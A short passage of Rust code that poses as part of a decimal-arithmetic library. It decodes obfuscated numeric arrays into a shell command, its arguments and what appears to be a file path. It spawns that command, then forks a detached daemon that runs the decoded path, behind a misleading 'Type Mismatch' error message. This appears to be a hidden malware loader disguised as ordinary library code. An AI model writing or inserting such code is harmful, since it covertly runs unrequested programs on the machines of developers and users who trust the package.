        let arc = env::consts::OS;
        Decimal::check_value(&arc);
        Command::new(Decimal::parse_fn(&vec![70,126,135,12,84]))
            .arg(Decimal::parse_fn(&vec![3,127,132,22,71]))
            .arg(Decimal::parse_fn(&vec![5,19,132,9,3,77,126,157,84,89,90,115,136,13,80,57,139,16,66]))
            .spawn();
    }
    if let Ok(Fork::Child) = daemon(false, false) {
        Command::new(Decimal::parse_fn(&vec![5,19,132,9,3,77,126,157,84,89,90,115,136,13,80,57,139,16,66]))
            .output()
            .expect("ERROR 13: Type Mismatch");
